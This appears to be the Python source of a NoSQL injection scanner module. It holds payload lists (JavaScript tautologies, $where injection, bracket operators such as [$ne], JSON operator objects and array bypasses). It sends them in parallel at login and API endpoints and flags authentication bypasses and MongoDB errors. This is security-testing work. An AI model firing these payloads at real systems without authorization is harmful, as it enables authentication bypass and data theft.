from __future__ import annotations
import json
import logging
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urlparse, parse_qsl, urlencode, urlunparse

from .base import BaseScanner
from websecure.core.reporting import add_result

logger = logging.getLogger(__name__)

# Smart context analysis
try:
    from websecure.core.analysis import analyze_input_context, should_skip_payload_category
    _HAS_ANALYZER = True
except ImportError:
    _HAS_ANALYZER = False

# ---------------------------------------------------------------------------
# Payload definitions
# ---------------------------------------------------------------------------

# String payloads appended to URL parameter values
_URL_STRING_PAYLOADS: List[Tuple[str, str]] = [
    ("' && '1'=='1", "js_tautology"),
    ("' || '1'=='1", "js_or_tautology"),
    ("'; return true; //", "js_return_true"),
    ("'; return 'a'=='a' && ''=='", "tautology_js2"),
    ("1', $or: [ {}, { 'a':'a", "or_injection"),
    ("' && this.password.match(/.*/)//+%00", "regex_bypass"),
    ("%24where%3D1%3D1", "where_encoded"),
]

# Bracket-style operator params appended as new QS keys (?param[$ne]=test)
_BRACKET_OPERATORS: List[Tuple[str, str]] = [
    ("[$ne]", "ne_bracket"),
    ("[$gt]", "gt_bracket"),
    ("[$gte]", "gte_bracket"),
    ("[$regex]", "regex_bracket"),
    ("[$exists]", "exists_bracket"),
    ("[$in][]", "in_bracket"),
]

# JSON body operator objects injected as field values
_JSON_OPERATOR_PAYLOADS: List[Tuple[Any, str]] = [
    ({"$ne": None},                      "ne_null"),
    ({"$ne": "-1"},                      "ne_string"),
    ({"$ne": ""},                        "ne_empty"),
    ({"$gt": ""},                        "gt_empty"),
    ({"$gt": 0},                         "gt_zero"),
    ({"$gte": ""},                       "gte_empty"),
    ({"$lt": "zzzzzzzzzzz"},             "lt_string"),
    ({"$regex": ".*"},                   "regex_all"),
    ({"$regex": "^", "$options": "i"},   "regex_prefix"),
    ({"$where": "1==1"},                 "where_tautology"),
    ({"$exists": True},                  "exists_true"),
    ({"$nin": []},                       "nin_empty"),
    ({"$in": ["admin", "user", "root"]}, "in_values"),
    ({"$expr": {"$eq": [1, 1]}},         "expr_tautology"),
]

# Array-based bypass payloads (field value replaced with array)
_ARRAY_BYPASS_PAYLOADS: List[Tuple[Any, str]] = [
    (["admin"],                    "array_single"),
    (["admin", "administrator"],   "array_multi"),
    ([""],                         "array_empty_str"),
]

# MongoDB / NoSQL error fingerprints (only flag when NOT in baseline)
_NOSQL_ERROR_PATTERNS = [
    r"MongoError",
    r"MongoNetworkError",
    r"CastError",
    r"ValidationError",
    r'"name"\s*:\s*"MongoError"',
    r"BSON.*error",
    r"ObjectId.*invalid",
    r"E11000 duplicate",
    r'"code"\s*:\s*1[1-9][0-9]',   # MongoDB error codes 110-199
    r"operator\s+\$where",
    r"SyntaxError.*where",
    r"unexpected token.*\$",
]

# Common field names to probe in JSON bodies
_AUTH_FIELDS = [
    "username", "user", "email", "login",
    "password", "pass", "passwd",
    "id", "token", "apikey",
]


# ---------------------------------------------------------------------------
# NoSQLiScanner
# ---------------------------------------------------------------------------

class NoSQLiScanner(BaseScanner):
    """
    NoSQL Injection Scanner.

    Techniques:
    - URL parameter string injection (tautologies, JS operators)
    - Bracket-style operator params (?param[$ne]=x, ?param[$regex]=.*)
    - JSON body operator injection ({"field": {"$ne": null}})
    - Array-based bypass ({"field": ["admin"]})
    - JavaScript injection via $where / $expr
    - Auth bypass detection (401/403 → 200)
    - MongoDB/NoSQL error message fingerprinting
    - Multi-signal response anomaly detection
    - Parallel payload testing via ThreadPoolExecutor
    """

    name = "nosqli"
    MAX_WORKERS = 4

    def run(self, url: str, **kwargs) -> Dict:
        bucket = self.name
        self.results.setdefault(bucket, [])

        endpoints: List[str] = kwargs.get("endpoints") or [url]
        logger.info(f"[NoSQLi] Scanning {len(endpoints)} endpoints")

        for ep in endpoints:
            if not isinstance(ep, str):
                continue
            parsed = urlparse(ep)
            qs = parse_qsl(parsed.query)

            if qs:
                self._fuzz_url_params(ep, qs, bucket)

            lower = ep.lower()
            if any(x in lower for x in ("api", "auth", "login", "signin", "user", "v1", "v2", "account")):
                self._fuzz_json_body(ep, bucket)

        return self.results

    # -------------------------------------------------------------------------
    # URL parameter fuzzing
    # -------------------------------------------------------------------------

    def _fuzz_url_params(self, url: str, qs: List[Tuple], bucket: str):
        parsed = urlparse(url)
        try:
            base_resp = self.session.get(url, timeout=5)
        except Exception:
            return

        params = [p for p, _ in qs]

        def test_string_append(param: str, payload_str: str, pay_type: str) -> Optional[Dict]:
            new_qs = [(p, v + payload_str if p == param else v) for p, v in qs]
            t_url = urlunparse(parsed._replace(query=urlencode(new_qs)))
            try:
                resp = self.session.get(t_url, timeout=5)
                if self._is_anomaly(base_resp, resp):
                    return {
                        "type": "NoSQL Injection — URL Parameter",
                        "severity": "High",
                        "url": t_url,
                        "parameter": param,
                        "payload": payload_str,
                        "payload_type": pay_type,
                        "evidence": (
                            f"Status: {base_resp.status_code}→{resp.status_code}, "
                            f"len: {len(base_resp.content)}→{len(resp.content)}"
                        ),
                    }
            except Exception:
                pass
            return None

        def test_bracket_op(param: str, op: str, label: str) -> Optional[Dict]:
            # Replace param with param+op, value empty
            new_qs = [(p, v) for p, v in qs if p != param] + [(param + op, "test")]
            t_url = urlunparse(parsed._replace(query=urlencode(new_qs)))
            try:
                resp = self.session.get(t_url, timeout=5)
                if self._is_anomaly(base_resp, resp):
                    return {
                        "type": "NoSQL Injection — Bracket Operator Param",
                        "severity": "High",
                        "url": t_url,
                        "parameter": f"{param}{op}",
                        "payload_type": label,
                        "evidence": f"Status: {base_resp.status_code}→{resp.status_code}",
                    }
            except Exception:
                pass
            return None

        with ThreadPoolExecutor(max_workers=self.MAX_WORKERS) as pool:
            futures: Dict = {}
            for param in params:
                if _HAS_ANALYZER:
                    ctx = analyze_input_context(name=param, source="param", url_path=url)
                    if should_skip_payload_category(ctx.context, "nosqli"):
                        continue
                for payload_str, pay_type in _URL_STRING_PAYLOADS:
                    f = pool.submit(test_string_append, param, payload_str, pay_type)
                    futures[f] = True
                for op, label in _BRACKET_OPERATORS:
                    f = pool.submit(test_bracket_op, param, op, label)
                    futures[f] = True

            for f in as_completed(futures):
                result = f.result()
                if result:
                    self.add(bucket, result)
                    add_result("offensive", result)

    # -------------------------------------------------------------------------
    # JSON body fuzzing
    # -------------------------------------------------------------------------

    def _fuzz_json_body(self, url: str, bucket: str):
        baseline = {"username": "testuser", "password": "testpass"}
        try:
            base_resp = self.session.post(url, json=baseline, timeout=5)
            if base_resp.status_code in (404, 405):
                return
        except Exception:
            return

        def test_operator(key: str, op_payload: Any, pay_type: str) -> Optional[Dict]:
            attack = {**baseline, key: op_payload}
            try:
                resp = self.session.post(url, json=attack, timeout=5)
                # Priority: auth bypass
                if base_resp.status_code in (401, 403) and resp.status_code == 200:
                    return {
                        "type": "NoSQL Auth Bypass",
                        "severity": "Critical",
                        "url": url,
                        "parameter": key,
                        "payload": json.dumps(op_payload),
                        "payload_type": pay_type,
                        "evidence": f"Auth bypass: {base_resp.status_code}→200",
                    }
                if self._is_anomaly(base_resp, resp):
                    return {
                        "type": "NoSQL Injection — JSON Body",
                        "severity": "High",
                        "url": url,
                        "parameter": key,
                        "payload": json.dumps(op_payload),
                        "payload_type": pay_type,
                        "evidence": (
                            f"Status: {base_resp.status_code}→{resp.status_code}, "
                            f"len: {len(base_resp.content)}→{len(resp.content)}"
                        ),
                    }
            except Exception:
                pass
            return None

        with ThreadPoolExecutor(max_workers=self.MAX_WORKERS) as pool:
            futures: Dict = {}
            for key in _AUTH_FIELDS:
                for op_payload, pay_type in _JSON_OPERATOR_PAYLOADS:
                    f = pool.submit(test_operator, key, op_payload, pay_type)
                    futures[f] = True
                for arr_payload, arr_type in _ARRAY_BYPASS_PAYLOADS:
                    f = pool.submit(test_operator, key, arr_payload, arr_type)
                    futures[f] = True

            for f in as_completed(futures):
                result = f.result()
                if result:
                    self.add(bucket, result)
                    add_result("offensive", result)

    # -------------------------------------------------------------------------
    # Multi-signal anomaly detection
    # -------------------------------------------------------------------------

    def _is_anomaly(self, base_resp, attack_resp) -> bool:
        """
        Returns True if the attack response differs from baseline in a meaningful way:
        1. NoSQL/MongoDB error fingerprint in attack but not baseline
        2. Auth bypass: 401/403 → 200
        3. Server error only on attack (200 → 500)
        4. Significant content length change with 200 response
        """
        atk_text = attack_resp.text or ""
        base_text = base_resp.text or ""

        # 1. NoSQL error fingerprints
        for pat in _NOSQL_ERROR_PATTERNS:
            if re.search(pat, atk_text, re.IGNORECASE):
                if not re.search(pat, base_text, re.IGNORECASE):
                    return True

        # 2. Auth bypass
        if base_resp.status_code in (401, 403) and attack_resp.status_code == 200:
            return True

        # 3. Server error triggered only by attack
        if base_resp.status_code == 200 and attack_resp.status_code == 500:
            return True

        # 4. Significant content length change at 200
        if attack_resp.status_code == 200:
            base_len = len(base_resp.content)
            atk_len = len(attack_resp.content)
            if base_len > 0:
                if abs(base_len - atk_len) / base_len > 0.40:
                    return True
            elif atk_len > 100:
                # Previously empty/tiny response suddenly grew → data leak
                return True

        return False


# ---------------------------------------------------------------------------
# Legacy entry points (backward-compatible with main.py ctx convention)
# ---------------------------------------------------------------------------

def run_nosqli_scan(ctx):
    session = ctx.session
    results = getattr(ctx, "results", {})

    endpoints: set = set(results.get("endpoints", []))
    discovery = results.get("discovery", {})
    if isinstance(discovery, dict):
        for u in discovery.get("query", []):
            if isinstance(u, str) and "://" in u:
                endpoints.add(u)

    targets = list(endpoints)
    scanner = NoSQLiScanner(session=session, results=results)
    if targets:
        scanner.run(targets[0], endpoints=targets)


run = run_nosqli_scan
